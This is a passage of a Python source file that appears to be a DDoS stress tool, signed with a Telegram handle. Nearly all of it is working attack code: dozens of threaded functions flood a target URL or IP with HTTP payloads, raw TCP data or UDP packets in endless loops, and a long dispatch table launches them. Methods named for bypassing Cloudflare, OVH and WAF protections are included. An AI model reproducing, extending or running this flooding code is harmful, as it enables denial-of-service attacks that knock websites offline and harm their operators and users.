            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload15()
                s.send(payl)
        except:
            pass

def attack():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload16()
                s.send(payl)
        except:
            pass

def gpt():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload17()
                s.send(payl)
        except:
            pass

def onec():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload18()
                s.send(payl)
        except:
            pass

def raw2():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload19()
                s.send(payl)
        except:
            pass

def https():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload20()
                s.send(payl)
        except:
            pass

def gurd():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload21()
                s.send(payl)
        except:
            pass

def bypassplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload22()
                s.send(payl)
        except:
            pass

def warplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload23()
                s.send(payl)
        except:
            pass

def browser():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload24()
                s.send(payl)
        except:
            pass

def request():
    while True:
        try:
            for _ in range(rpc):
                requests.get(url)
        except:
            pass

def get2():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload25()
                s.send(payl)
        except:
            pass

def request2():
    while True:
        try:
            for _ in range(rpc):
                scraper = cloudscraper.create_scraper()
                scraper = cloudscraper.CloudScraper()
                scraper.get(url, headers=ua, timeout=rpc)
                requests.get(url)
        except:
            pass

def uamplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload26()
                s.send(payl)
        except:
            pass

def cfplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload27()
                s.send(payl)
        except:
            pass

def ovh():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload28()
                s.send(payl)
        except:
            pass

def ovh_bypass():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload29()
                s.send(payl)
        except:
            pass

def spoof():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload30()
                ipt = spo_ip()
                s.send(payl)
        except:
            pass

def uam2():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload31()
                s.send(payl)
        except:
            pass

def warplusplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload32()
                s.send(payl)
        except:
            pass

def wafplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload33()
                s.send(payl)
        except:
            pass

def boomplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload34()
                s.send(payl)
        except:
            pass

def http2():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload35()
                s.send(payl)
        except:
            pass

def pps():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload36()
                s.send(payl)
        except:
            pass

def cfbpro():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload37()
                s.send(payl)
        except:
            pass

def syn():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            for _ in range(rpc):
                payl = f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agnet: {ua}\r\n\r\n'.encode(encoding='utf-8')
                s.send(payl)
        except:
            pass

def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            for _ in range(rpc):
                payl = byt(10240)
                s.send(payl)
        except:
            pass

def udp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            for _ in range(rpc):
                payl = byt(3072)
                s.sendto(payl, (target,port))
        except:
            pass

def rudp():
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			pack = byt(ran(512, 3072))
			for _ in range(rpc):
				s.sendto(pack, (target, port))
		except:
			pass
			
def rtcp():
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((target, port))
			pack = byt(ran(512, 3072))
			for _ in range(rpc):
				s.send(pack)
		except:
			pass

if method == "raw":
    for _ in range(threads):
        t = threading.Thread(target=raw)
        t.start()
elif method == "war":
    for _ in range(threads):
        t = threading.Thread(target=war)
        t.start()
elif method == "waf":
    for _ in range(threads):
        t = threading.Thread(target=waf)
        t.start()
elif method == "mix":
    for _ in range(threads):
        t = threading.Thread(target=mix)
        t.start()
elif method == "get":
    for _ in range(threads):
        t = threading.Thread(target=get)
        t.start()
elif method == "http":
    for _ in range(threads):
        t = threading.Thread(target=http)
        t.start()
elif method == "bypass":
    for _ in range(threads):
        t = threading.Thread(target=bypass)
        t.start()
elif method == "sky":
    for _ in range(threads):
        t = threading.Thread(target=sky)
        t.start()
elif method == "uam":
    for _ in range(threads):
        t = threading.Thread(target=uam)
        t.start()
elif method == "boom":
    for _ in range(threads):
        t = threading.Thread(target=boom)
        t.start()
elif method == "stress":
    for _ in range(threads):
        t = threading.Thread(target=stress)
        t.start()
elif method == "cf":
    for _ in range(threads):
        t = threading.Thread(target=cf)
        t.start()
elif method == "cfb":
    for _ in range(threads):
        t = threading.Thread(target=cfb)
        t.start()
elif method == "crash":
    for _ in range(threads):
        t = threading.Thread(target=crash)
        t.start()
elif method == "veep":
    for _ in range(threads):
        t = threading.Thread(target=veep)
        t.start()
elif method == "head":
    for _ in range(threads):
        t = threading.Thread(target=head)
        t.start()
elif method == "attack":
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
elif method == "gpt":
    for _ in range(threads):
        t = threading.Thread(target=gpt)
        t.start()
elif method == "raw2":
    for _ in range(threads):
        t = threading.Thread(target=raw2)
        t.start()
elif method == "onec":
    for _ in range(threads):
        t = threading.Thread(target=onec)
        t.start()
elif method == "https":
    for _ in range(threads):
        t = threading.Thread(target=https)
        t.start()
elif method == "gurd":
    for _ in range(threads):
        t = threading.Thread(target=gurd)
        t.start()
elif method == "bypass+":
    for _ in range(threads):
        t = threading.Thread(target=bypassplus)
        t.start()
elif method == "browser":
    for _ in range(threads):
        t = threading.Thread(target=browser)
        t.start()
elif method == "war+":
    for _ in range(threads):
        t = threading.Thread(target=warplus)
        t.start()
elif method == "requests":
    for _ in range(threads):
        t = threading.Thread(target=request)
        t.start()
elif method == "get2":
    for _ in range(threads):
        t = threading.Thread(target=get2)
        t.start()
elif method == "requests2":
    for _ in range(threads):
        t = threading.Thread(target=request2)
        t.start()
elif method == "uam+":
    for _ in range(threads):
        t = threading.Thread(target=uamplus)
        t.start()
elif method == "cf+":
    for _ in range(threads):
        t = threading.Thread(target=cfplus)
        t.start()
elif method == "ovh":
    for _ in range(threads):
        t = threading.Thread(target=ovh)
        t.start()
elif method == "ovh-bypass":
    for _ in range(threads):
        t = threading.Thread(target=ovh_bypass)
        t.start()
elif method == "spoof":
    for _ in range(threads):
        t = threading.Thread(target=spoof)
        t.start()
elif method == "uam2":
    for _ in range(threads):
        t = threading.Thread(target=uam2)
        t.start()
elif method == "war++":
    for _ in range(threads):
        t = threading.Thread(target=warplusplus)
        t.start()
elif method == "waf+":
    for _ in range(threads):
        t = threading.Thread(target=wafplus)
        t.start()
elif method == "boom+":
    for _ in range(threads):
        t = threading.Thread(target=boomplus)
        t.start()
elif method == "http2":
    for _ in range(threads):
        t = threading.Thread(target=http2)
        t.start()
elif method == "pps":
    for _ in range(threads):
        t = threading.Thread(target=pps)
        t.start()
elif method == "cfbpro":
    for _ in range(threads):
        t = threading.Thread(target=cfbpro)
        t.start()
elif method == "tcp":
    for _ in range(threads):
        t = threading.Thread(target=tcp)
        t.start()
elif method == "udp":
    for _ in range(threads):
        t = threading.Thread(target=udp)
        t.start()
elif method == "rtcp":
    for _ in range(threads):
        t = threading.Thread(target=rtcp)
        t.start()
elif method == "rudp":
    for _ in range(threads):
        t = threading.Thread(target=rudp)
        t.start()
elif method == "syn":
    for _ in range(threads):
        t = threading.Thread(target=syn)
        t.start()

#Telegram me : @HjAmir_3